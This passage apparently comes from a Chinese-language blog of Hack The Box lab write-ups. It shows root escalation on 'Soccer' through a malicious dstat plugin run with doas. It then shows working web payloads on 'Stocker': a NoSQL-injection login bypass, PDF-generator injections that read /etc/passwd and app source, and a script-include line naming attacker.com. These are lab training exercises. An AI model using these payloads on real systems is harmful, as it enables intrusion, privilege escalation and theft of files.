<code>/usr/bin/dstat</code>\uff0c\u90a3\u4e48\u518d\u641c\u4e00\u4e0b <code>dstat</code> \u662f\u5426\u6709\u4ec0\u4e48\u5229\u7528\u3002  </p> <p>\u6f0f\u6d1e\u62ab\u9732\uff1ahttps://www.rapid7.com/db/vulnerabilities/gentoo-linux-cve-2009-3894/ \u6f0f\u6d1e\u62ab\u9732\uff1ahttps://vulners.com/centos/CESA-2009:1619 exp\uff1ahttps://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/#dstat</p> <pre><code>player@soccer:~$ find / -type d -name dstat -exec ls -ld {} \\; 2&gt;/dev/null\ndrwxr-xr-x 2 root root 4096 Nov 17 09:09 /usr/share/doc/dstat\ndrwxr-xr-x 3 root root 4096 Nov 17 09:09 /usr/share/dstat\ndrwxrwx--- 2 root player 4096 Jan  8 09:15 /usr/local/share/dstat\n</code></pre> <p><code>/usr/local/share/dstat</code> \u6709\u5199\u5165\u6743\u9650\uff0c\u90a3\u4e48\u53bb\u8fd9\u4e2a\u76ee\u5f55\u8fdb\u884c\u540e\u7eedexploit\uff1a <pre><code>player@soccer:~$ cd /usr/local/share/dstat\n\nplayer@soccer:/usr/local/share/dstat$ echo -e \"import os\\nos.system('chmod +s /usr/bin/bash')\" &gt; dstat_exploit.py\nplayer@soccer:/usr/local/share/dstat$ cat dstat_exploit.py \nimport os\nos.system('chmod +s /usr/bin/bash')\nplayer@soccer:/usr/local/share/dstat$ dstat --list\ninternal:\n        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,\n        mem,mem-adv,net,page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,\n        zones\n/usr/share/dstat:\n        battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,\n        disk-util,disk-wait,dstat,dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,\n        helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,\n        mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,\n        mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,\n        net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,\n        qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,\n        snooze,squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,\n        top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,top-mem,top-oom,utmp,\n        vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,\n        zfs-zil\n/usr/local/share/dstat:\n        exploit\n\nplayer@soccer:/usr/local/share/dstat$ /usr/bin/dstat --exploit\n/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses\n  import imp\nchmod: changing permissions of '/usr/bin/bash': Operation not permitted\nModule dstat_exploit failed to load. (name 'dstat_plugin' is not defined)\nNone of the stats you selected are available.\n</code></pre></p> <p>exploit\u62a5\u9519\u3002\u6b63\u5e38\uff0c\u60f3\u60f3\u6211\u4eec\u4e5f\u6ca1\u6709root\u6743\u9650\u53bb\u8bbe\u7f6ebash\u7684SUID\u3002\u786e\u8ba4\u4e00\u4e0b\u60f3\u6cd5\uff1a <pre><code>player@soccer:/usr/local/share/dstat$ echo -e \"import os\\nos.system('id')\" &gt; dstat_exploit.py\nplayer@soccer:/usr/local/share/dstat$ dstat --exploit\n/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses\n  import imp\nuid=1001(player) gid=1001(player) groups=1001(player)\nModule dstat_exploit failed to load. (name 'dstat_plugin' is not defined)\nNone of the stats you selected are available.\n</code></pre></p> <p>\u81f3\u6b64\uff0c\u6211\u7a81\u7136\u610f\u8bc6\u5230\u81ea\u5df1\u53c8\u5f00\u59cb\u50bb\u4e86\uff0c\u65e2\u7136doas\u7c7b\u4f3csudo\uff0c\u90a3\u4e48\u6211\u6267\u884c\u547d\u4ee4\u65f6\u4e5f\u5e94\u8be5\u7528\u548csudo\u4e00\u6837\u7684\u683c\u5f0f\u554a\u2026\u2026 \u4e14doas\u6211\u4eec\u4e4b\u524d\u786e\u8ba4\u8fc7\u6709\u8bbe\u7f6eSUID\uff0c\u4ee5\u53ca\u5176\u6743\u9650\u662froot\uff1a <pre><code>player@soccer:/usr/local/share/dstat$ ls -l /usr/local/bin/doas\n-rwsr-xr-x 1 root root 42224 Nov 17 09:09 /usr/local/bin/doas\n</code></pre></p> <p>\u6240\u4ee5exploit\u547d\u4ee4\u5e94\u8be5\u662f\u8fd9\u6837\uff1a <pre><code>player@soccer:/usr/local/share/dstat$ echo -e \"import os\\nos.system('id')\" &gt; dstat_exploit.py\nplayer@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit\n/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses\n  import imp\nuid=0(root) gid=0(root) groups=0(root)\nModule dstat_exploit failed to load. (name 'dstat_plugin' is not defined)\nNone of the stats you selected are available.\n</code></pre></p> <p>\u6210\u529f\u83b7\u53d6root shell\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#get-root-flag","title":"get root flag","text":"<p>\u4e0d\u8fc7\u79c9\u6301\u7740\u5c3d\u91cf\u5c11\u5730\u4fee\u6539\u7cfb\u7edf\u7684\u539f\u5219\u3002\u60f3\u60f3\u6309\u7167exp\u6587\u7ae0\u91cc\u76f4\u63a5\u7ed9bash\u8bbe\u7f6eSUID\u7684\u505a\u6cd5\u4e0d\u592a\u59a5\u5f53\uff0c\u6240\u4ee5\u6211\u9009\u62e9\u76f4\u63a5\u62ffflag\uff1a <pre><code>echo -e \"import os\\nos.system('cat /root/root.txt')\" &gt; dstat_exploit.py\ndoas /usr/bin/dstat --exploit\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Soccer/#_9","title":"\u540e\u8bb0","text":"<p>\u7b2c\u4e00\u6b21\u73a9\u4e86\u4e00\u628a\u65b0\u9c9c\u51fa\u7089\u653e\u5728Release Area\u7684\u9776\u673a~\u624d\u77e5\u9053\u539f\u6765\u65b0\u9776\u673a\u662f\u7528\u53e6\u4e00\u4e2aovpn\uff0c\u5e76\u4e14\u4e00\u4eba\u4e00\u9776\u673a\u3002 \u770b\u7740\u4e4b\u524d\u4e00\u90e8Windows\u7684Support\u8981\u9000\u5f79\uff0c\u8fd9\u53f0\u5f00\u59cb\u8fdb\u5165\u5012\u6570\uff0c\u7b97\u7b97\u6b63\u597d\u662f\u5468\u672b\u653e\u5047\u65f6\u95f4\u3002\u4e8e\u662f\u5c31\u60f3\u7740\u6211\u4e5f\u8981\u5c1d\u4e2a\u65b0\u9c9c~\u4e24\u5929\u6253\u4e0b\u6765\u5341\u5206\u5f00\u5fc3\u3002</p> <p>\u603b\u4f53\u6765\u8bf4\u611f\u89c9\u6bd4\u4e4b\u524d\u6253\u7684\u90a3\u51e0\u53f0Esay\u96be\u4e00\u4e9b\uff0c\u770bForum\u8fc7\u4e86\u7684\u4eba\u4e5f\u8bf4\u4e0d\u50cf\u662fEsay\u7684\u9776\u673a\u3002\u4e0d\u8fc7\u5b66\u5230\u4e86\u5f88\u591a\uff0c\u5341\u5206\u5f00\u5fc3\u3002 \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6709\u70b9\u7ed5\uff0c\u4ee5\u53ca\u7cfb\u7edf\u6709\u5404\u79cd\u6e05\u7406\u8fd8\u633a\u70e6\u7684\u3002  </p> <p>\u540e\u6765\u5076\u7136\u5728\u4e00\u4e2a\u7f51\u7ad9\u770b\u5230\u522b\u4eba\u7684WP\uff0c\u5173\u4e8e\u5982\u4f55\u627e\u5230\u53e6\u4e00\u4e2a\u7f51\u9875\uff08soc-player.htb\uff09\u6709\u4e2a\u65b0\u601d\u8def\uff1a\u67e5\u770bhosts\u6587\u4ef6\u3002 \u60ca\u4e86\uff0c\u8fde\u5fd9\u8bd5\u4e86\u4e0b\u770b\u770b\u662f\u4e0d\u662f\u771f\u7684\uff1a <pre><code>bash-5.0$ cat /etc/hosts\ncat /etc/hosts\n127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb\n\n127.0.1.1       ubuntu-focal    ubuntu-focal\n</code></pre></p> <p>\u5b66\u5230\u4e86\u5b66\u5230\u4e86\u554a\uff0c\u770b\u6765\u4ee5\u540ehosts\u6587\u4ef6\u4e5f\u8981\u5217\u5165\u4fe1\u606f\u6536\u96c6\u7684\u8303\u56f4\u91cc\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/","title":"HTB-Stocker","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#_1","title":"\u626b\u63cf","text":"<p>\u5c06\u81ea\u5df1\u4fa6\u67e5\u65f6\u5e38\u7528\u7684\u547d\u4ee4\u5199\u4e86\u4e2a\u811a\u672c\uff1a\u5de5\u4f5c\u6d41</p> <ul> <li>22/tcp open  ssh \u00a0 \u00a0 \u00a0 \u00a0 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</li> <li>80/tcp open  http \u00a0 \u00a0 \u00a0 nginx 1.18.0 (Ubuntu)</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#80","title":"80\u7aef\u53e3","text":"<ul> <li>robots.txt\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f<ul> <li>staff\uff1aAngoose Garden, Head of IT at Stockers Ltd.</li> <li>Made by templatedeck.com</li> </ul> </li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u65e0\u53d1\u73b0</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u53d1\u73b0</li> <li>\u5b50\u57df\u679a\u4e3e<ul> <li> <p>Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login]</p> </li> </ul> </li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u7531\u4e8e\u53d1\u73b0\u5b50\u57df\uff0c\u4e14\u662f\u4e2a\u767b\u9646\u754c\u9762\uff0c\u6240\u4ee5\u4f3c\u4e4e\u5e76\u4e0d\u9700\u8981</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#devstockerhtb","title":"\u5b50\u57df\uff1adev.stocker.htb","text":"<p>\u5c06\u5176\u52a0\u5165hosts\u6587\u4ef6\u540e\u8bbf\u95ee\uff0c\u662f\u4e2a\u767b\u9646\u754c\u9762\u3002 \u7a0d\u5fae\u8bd5\u4e86\u4e0bSQLi\u4f3c\u4e4e\u4e0d\u884c\u3002</p> <ul> <li>\u7f51\u9875\u6e90\u7801<ul> <li>Hugo 0.84.0\uff08\u641c\u4e86\u4e0b\u4f3c\u4e4e\u6ca1\u6f0f\u6d1e\uff09</li> <li>bootstrap@5.0.2</li> <li>name=\"username\" placeholder=\"jsmith\"</li> <li>name=\"password\" placeholder=\"Password\"</li> </ul> </li> <li>\u76ee\u5f55\u679a\u4e3e<ul> <li> <p>/stock \u00a0 \u00a0 \u00a0 \u00a0 (Status: 302) [Size: 48] [--&gt; /login?error=auth-required]</p> </li> </ul> </li> </ul> <p>\u611f\u89c9\u7a81\u7834\u53e3\u5c31\u5728\u767b\u9646\u754c\u9762\u4e86\u2026\u2026\u53c8\u8bd5\u4e86\u4e0bplaceholder\u90a3\u91cc\u5199\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u767b\u9646\u5931\u8d25\u3002</p> <p>\u6ce8\u610f\u5230\u6211\u4eec\u591a\u6b21\u8bf7\u6c42\u7684cookie\u503c\u662f\u56fa\u5b9a\u7684\uff0c\u90a3\u5c1d\u8bd5\u7528sqlmap\u8dd1\u4e00\u4e0b\u5427\u3002 <pre><code>\u2514\u2500$ cat login-post.txt        \nPOST /login HTTP/1.1\nHost: dev.stocker.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\nOrigin: http://dev.stocker.htb\nConnection: close\nReferer: http://dev.stocker.htb/login\nCookie: connect.sid=s%3AqGZ3cfqla8iZ8Z0kCgb0XFSH8yU28ZmZ.DHCZS1Pt2nPi34yO9KLryJeTtuIHKbjeBTVSVWxiCGs\nUpgrade-Insecure-Requests: 1\n\nusername=admin&amp;password=admin \n</code></pre></p> <p>\u8bd5\u4e86\u8fd9\u4e24\u79cd\u8bed\u6cd5\u90fd\u6ca1\u7ed3\u679c\u2026\u2026 <pre><code>\u2514\u2500$ sqlmap -r login-post.txt -p username\n\n\u2514\u2500$ sqlmap -u 'http://dev.stocker.htb/login' --cookie='s%3AqGZ3cfqla8iZ8Z0kCgb0XFSH8yU28ZmZ.DHCZS1Pt2nPi34yO9KLryJeTtuIHKbjeBTVSVWxiCGs' --data 'username=admin&amp;password=admin' -p \"username,password\" --method POST\n</code></pre></p> <p>\u540e\u6765\u4e86\u89e3\u5230\u4f3c\u4e4esqlmap\u4f3c\u4e4e\u4e0d\u80fd\u6d4b\u8bd5NoSQLi\uff1f\u800c\u5bf9\u4e8eNoSQLi\u53e6\u6709\u4e2aNoSQLMap 0.0 \u4e0d\u61c2\u4e86\u2026\u2026\u7136\u540e\u770b\u4e86\u773c\u5b98\u65b9\u8bba\u575b\u8bf4IppSec\u89e3\u8bf4\u7684Shoppy\u5341\u5206\u5177\u6709\u53c2\u8003\u6027 0.0</p> <p>\u6839\u636eIppSec\u89e3\u8bf4\u7684Shoppy\uff0c\u770b\u4e86\u773cwappalyzer\u63d2\u4ef6\uff0c\u53d1\u73b0\u8fd0\u884cNode.js\u5e94\u7528\uff0c\u4ee5\u53caExpress\u6846\u67b6\u3002 \u8fd9\u91cc\u4f3c\u4e4e\u662f\u4e00\u6837\u7684\u60c5\u51b5\uff0cNoSQLi</p> <p>\u987a\u4fbf\u8bb0\u5f55\u51e0\u4e2a\u77e5\u8bc6\u70b9\uff1a</p> <ul> <li><code>username[$ne]=toto&amp;password[$ne]=toto</code> \u8fd9\u79cd\u5728username\u7528\u6570\u7ec4\u7684\uff0c\u6216\u8005\u5c31\u5355\u7eaf\u662f\u5b57\u7b26\u4e32(scalar)\u7684\uff0c\u4e00\u822c\u662fPHP\u3001Apache</li> <li>\u800cnpm\u670d\u52a1\u5668\u3001Node.js\u5c31\u4e00\u822c\u5c06\u62a5\u5934 <code>Content-Type</code> \u7684 <code>application/x-www-form-urlencoded</code> \u6539\u4e3a <code>application/json</code>\uff0c\u7136\u540e\u7528json\u683c\u5f0f\u7684payload\uff1a<code>{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null} }</code><ul> <li>\u4e5f\u53ef\u5728\u6539\u5b8c\u62a5\u5934\u540e\uff0c\u5148\u8bd5\u8bd5\u8bf7\u6c42\u6b63\u5e38\u7684json\u6570\u636e\uff0c\u6216\u8005\u5c11\u653e\u4e00\u4e2ajson\u503c\uff0c\u786e\u8ba4\u4e00\u4e0b\u670d\u52a1\u5668\u662f\u5426\u89e3\u6790json</li> </ul> </li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#nosqli","title":"NoSQLi\u7ed5\u8fc7\u767b\u9646","text":"<p>\u6839\u636e\u4e0a\u8ff0\u64cd\u4f5c\uff0c\u770bBurp\u7684\u54cd\u5e94\u4f3c\u4e4e\u662f\u6210\u529f\u4e86\uff1a <pre><code>HTTP/1.1 302 Found\nServer: nginx/1.18.0 (Ubuntu)\nDate: Sat, 27 May 2023 14:44:49 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 56\nConnection: close\nX-Powered-By: Express\nLocation: /stock\nVary: Accept\n\n&lt;p&gt;Found. Redirecting to &lt;a href=\"/stock\"&gt;/stock&lt;/a&gt;&lt;/p&gt;\n</code></pre></p> <p>\u7ed5\u8fc7\u767b\u9646\u540e\u4f1a\u91cd\u5b9a\u5411\u5230\"/stock\"\uff0c\u8fd9\u4e2a\u76ee\u5f55\u6211\u4eec\u4e4b\u524d\u4e5f\u679a\u4e3e\u5230\u8fc7\u3002 \u800c\u7531\u4e8ecookie\u503c\u56fa\u5b9a\uff0c\u6211\u4eec\u73b0\u5728\u5e94\u8be5\u7b97\u662f\u5df2\u767b\u5f55\u7684\u72b6\u6001\u4e86\u3002 \u7528\u6d4f\u89c8\u5668\u8bbf\u95ee\u4e00\u4e0b <code>http://dev.stocker.htb/stock</code>\uff0c\u6210\u529f\u8fdb\u5165\uff1a </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#_3","title":"\u62e6\u622a\u3001\u4fee\u6539\u8ba2\u5355\u8bf7\u6c42\u53d1\u73b0\u6ce8\u5165\u70b9","text":"<p>\u8fdb\u5165<code>/stock</code> \u754c\u9762\u540e\uff0c\u968f\u4fbf\u70b9\u70b9\uff0c\u53d1\u73b0\u4f3c\u4e4e\u5c31\u662f\u4e00\u4e2a\u8d2d\u7269\u9875\u9762\u3002\u53d1\u9001\u8ba2\u5355\u4e4b\u540e\u4f1a\u7ed9\u4f60\u4e00\u4e2a\u94fe\u63a5\uff0c\u70b9\u5f00\u5c31\u662f\u521a\u521a\u4e70\u4e1c\u897f\u7684\u8ba2\u5355\uff1f \u518d\u770b\u770bBurp\u7684\u8bf7\u6c42\uff0c\u4f3c\u4e4eItem\u90a3\u91cc\u7684\u503c\u5c31\u662f\u8bf7\u6c42\u91cctitle\u7684\u503c\uff1a </p> <p>\u5c1d\u8bd5Burp\u62e6\u622a\u8bf7\u6c42\uff0c\u5c06\u201cCup\u201d\u6539\u4e3a\u201c/etc/passwd\u201d\u770b\u770b\u7ed3\u679c\u3002\u7684\u786eItem\u503c\u6709\u53d8\u5316\uff1a </p> <p>\u4e0d\u8fc7\u5149\u663e\u793a\u201c/etc/passwd\u201d\u6ca1\u5565\u610f\u4e49\u554a\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#pdf","title":"\u4e0b\u8f7d\u3001\u5206\u6790pdf\u8ba2\u5355","text":"<p>\u800c\u8fd9\u4e2a\u8ba2\u5355\uff0c\u4f3c\u4e4e\u662f\u4e2apdf\u6587\u4ef6\uff0c\u5148\u4e0b\u8f7d\u4e0b\u6765\uff0c\u7136\u540e\u7528 <code>exiftool</code> \u770b\u770b\u6709\u4ec0\u4e48\u4fe1\u606f\uff1a <pre><code>\u2514\u2500$ exiftool document.pdf        \nExifTool Version Number         : 12.44\nFile Name                       : document.pdf\nDirectory                       : .\nFile Size                       : 40 kB\nFile Modification Date/Time     : 2023:05:27 22:33:09-04:00\nFile Access Date/Time           : 2023:05:27 22:33:09-04:00\nFile Inode Change Date/Time     : 2023:05:27 22:33:51-04:00\nFile Permissions                : -rw-r--r--\nFile Type                       : PDF\nFile Type Extension             : pdf\nMIME Type                       : application/pdf\nPDF Version                     : 1.4\nLinearized                      : No\nPage Count                      : 1\nTagged PDF                      : Yes\nCreator                         : Chromium\nProducer                        : Skia/PDF m108\nCreate Date                     : 2023:05:28 02:32:30+00:00\nModify Date                     : 2023:05:28 02:32:30+00:00\n</code></pre></p> <p>\u8fd9\u4e2aPDF\u6587\u4ef6\u5e94\u8be5\u662f\u7531\u201cSkia/PDF m108\u201d\u751f\u6210\u7684\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#pdfxss","title":"\u52a8\u6001PDF\u7684XSS","text":"<p>\u8c37\u6b4c\u4e00\u4e0b <code>Skia/PDF m108</code>\uff0c\u53d1\u73b0\u6709hacktricks\u5173\u4e8e\u52a8\u6001PDF\u7684\u5229\u7528\u3002</p> <p>\u53e6\u5916\u8fd8\u80fd\u627e\u5230\u8fd9\u4e24\u7bc7\u6587\u7ae0\u5b66\u4e60\u4e00\u4e0b\uff1a  </p> <p>https://www.triskelelabs.com/microstrategy-ssrf-through-pdf-generator-cve-2020-24815 https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file</p> <pre><code>&lt;script&gt;document.write(JSON.stringify(window.location))&lt;/script&gt;\n</code></pre> <p>\u5c06\u4e0a\u9762\u7684payload\u653e\u5230Item\u7684\u503c\uff0c\u6ce8\u5165\u6709\u6548\uff1a </p> <p>\u4e00\u5f00\u59cb\u5c1d\u8bd5 <code>&lt;img src=\"x\" onerror=\"document.write('test')\" /&gt;</code> \u4e0d\u884c\uff0c\u8fd8\u60f3\u7740\u4f30\u8ba1\u6709\u53cc\u5f15\u53f7\u7684payload\u90fd\u4e0d\u884c\u3002\u540e\u6765\u8bd5\u4e86\u4e0b\u53ea\u8981\u628a\u53cc\u5f15\u53f7\u8f6c\u4e49\u4e00\u4e0b\u5c31\u884c\uff1a<code>&lt;img src=\\\"x\\\" onerror=\\\"document.write('test')\\\" /&gt;</code></p> <p>\u518d\u770b\u770bhacktricks\u91cc\u9762\u6709\u4ec0\u4e48\u5229\u7528\u65b9\u5f0f\u3002</p> <ul> <li>\u65e2\u7136\u53cc\u5f15\u53f7\u4e0d\u662f\u95ee\u9898\u4e86\uff0c\u90a3\u5148\u8bd5\u8bd5\u8fd9\u91cc\u7684\u7b2c\u4e00\u4e2apayload\u83b7\u53d6 /etc/passwd\u3002\u4e0d\u8fc7\u7ed3\u679c\u662f\u8ba2\u5355\u6587\u4ef6\u663e\u793a\u4e86\u4e00\u884c\u4e00\u957f\u4e32\u7684\u5b57\u7b26\uff0c\u4f3c\u4e4e\u8fd8\u56e0\u4e3a\u592a\u957f\u4e86\u4e00\u884c\u8fd8\u663e\u793a\u4e0d\u5168\u2026\u2026</li> <li><code>&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;</code> \u8fd9\u4e2apayload\u5012\u662f\u53ef\u4ee5\u6b63\u5e38\u663e\u793a\uff0c\u4e0d\u8fc7\u53ea\u663e\u793a\u4e86\u524d\u9762\u51e0\u884c\u3002\u5c1d\u8bd5\u66f4\u6539\u4e00\u4e0biframe\u7684\u5927\u5c0f <code>&lt;iframe src=file:///etc/passwd width='1000' height='1000'&gt;&lt;/iframe&gt;</code>\uff0c\u83b7\u5f97\u4e86\u670d\u52a1\u5668\u7684\u7528\u6237\u5217\u8868\uff1a<pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:113::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:114::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nfwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nmongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin\nangoose:x:1001:1001:,,,:/home/angoose:/bin/bash\n_laurel:x:998:998::/var/log/laurel:/bin/false\n</code></pre> </li> </ul> <p>\u51e0\u4e2a\u503c\u5f97\u5173\u6ce8\u7684\u5730\u65b9\uff1a</p> <ul> <li>\u6570\u636e\u5e93\uff1amongodb</li> <li>id\u5927\u4e8e1000\u7528\u6237\uff1aangoose</li> <li>\u5f00\u7684\u670d\u52a1\u8fd8\u633a\u591a\uff0c\u5176\u4ed6\u9776\u673a\u90fd\u6ca1\u600e\u4e48\u89c1\u5230mail\u3001proxy\u4ec0\u4e48\u7684</li> </ul> <p>\u8bd5\u4e86\u4e0b\u83b7\u53d6shadow\u5931\u8d25\uff0c\u83b7\u53d6\u7528\u6237angoose\u7684SSH\u5bc6\u94a5\u4e5f\u5931\u8d25\uff0c\u611f\u89c9\u4e5f\u8d70\u4e0d\u901a\u4e86\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#_4","title":"\u52a0\u8f7d\u5916\u90e8\u811a\u672c","text":"<p>\u6839\u636ehacktricks\u7684payload <code>&lt;script src=\"http://attacker.com/myscripts.js\"&gt;&lt;/script&gt;</code>\uff0c\u5c1d\u8bd5\u4e00\u4e0b\u52a0\u8f7d\u5916\u90e8\u811a\u672c\u3002</p> <p>\u9996\u5148\u9a8c\u8bc1\u662f\u5426\u53ef\u884c\uff1a <pre><code>\u2514\u2500$ ls\ntest.txt\n\n\u2514\u2500$ python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.196 - - [27/May/2023 23:39:46] \"GET /test.txt HTTP/1.1\" 200 -\n</code></pre></p> <p>OK\uff0c\u90a3\u5c31\u5199\u4e2a\u53cd\u5f39shell\u2026\u2026 \u4e0d\u8fc7\u5c1d\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u7684\u786e\u6709\u83b7\u53d6\u6211\u7684\u811a\u672c\uff0c\u4f46\u662f\u5927\u6982\u662f\u6ca1\u6709\u6267\u884c\uff1f\u62ff\u4e0d\u5230shell\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#initial-access","title":"Initial Access","text":"<p>\u770b\u4e86\u773c\u5b98\u65b9\u8bba\u575b\uff0c\u8bf4\u53ef\u4ee5\u770b\u770b <code>/var/www/dev/index.js</code> \u8fd9\u4e2a\u6587\u4ef6\uff1f\u4e0d\u77e5\u9053\u600e\u4e48\u77e5\u9053\u8981\u627e\u8fd9\u4e2a\u6587\u4ef6\u7684\u2026\u2026</p> <p>\u540e\u6765\u7ffb\u627eWP\uff0c\u770b\u5230\u8fd9\u7bc7\u89e3\u91ca\u5f97\u5f88\u8be6\u7ec6\u3002\u539f\u6765\u662f\u9700\u8981\u4e00\u70b9Node.js\u7684\u77e5\u8bc6\u554a\uff0c\u8981\u4e86\u89e3\u8fd9\u4e2a\u9879\u76ee\u7684\u67b6\u6784\u3002 \u4e4b\u524d\u7528\u7b2c\u4e00\u4e2aXSS\u7684payload\u65f6\u6211\u4eec\u77e5\u9053\u8ba2\u5355\u6587\u6863\u7684\u8def\u5f84\u662f\u5728 <code>/var/www/dev/pos/</code> \u4e0b\u9762\uff0c\u8c01\u77e5\u9053\u8fd9\u4e2a\u201cdev\u201d\u5c31\u662f\u5b50\u57df\u8fd9\u4e2adev\u554a\u2026\u2026\u4ee5\u53ca <code>index.js</code> \u8fd9\u4e2a\u6587\u4ef6\u8f83\u91cd\u8981\u3002</p> <p>\u6839\u636e\u63d0\u793a\uff0c\u53d1\u9001payload <code>&lt;iframe src=file:///var/www/dev/index.js width='1000' height='1000'&gt;&lt;/iframe&gt;</code>\u540e\uff0c\u83b7\u5f97 <code>/var/www/dev/index.js</code> \u6587\u4ef6\u4e0b\u7684\u5bc6\u7801\uff1a <pre><code>const express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst session = require(\"express-session\");\nconst MongoStore = require(\"connect-mongo\");\nconst path = require(\"path\");\nconst fs = require(\"fs\");\nconst { generatePDF, formatHTML } = require(\"./pdf.js\");\nconst { randomBytes, createHash } = require(\"crypto\");\nconst app = express();\nconst port = 3000;\n// TODO: Configure loading from dotenv for 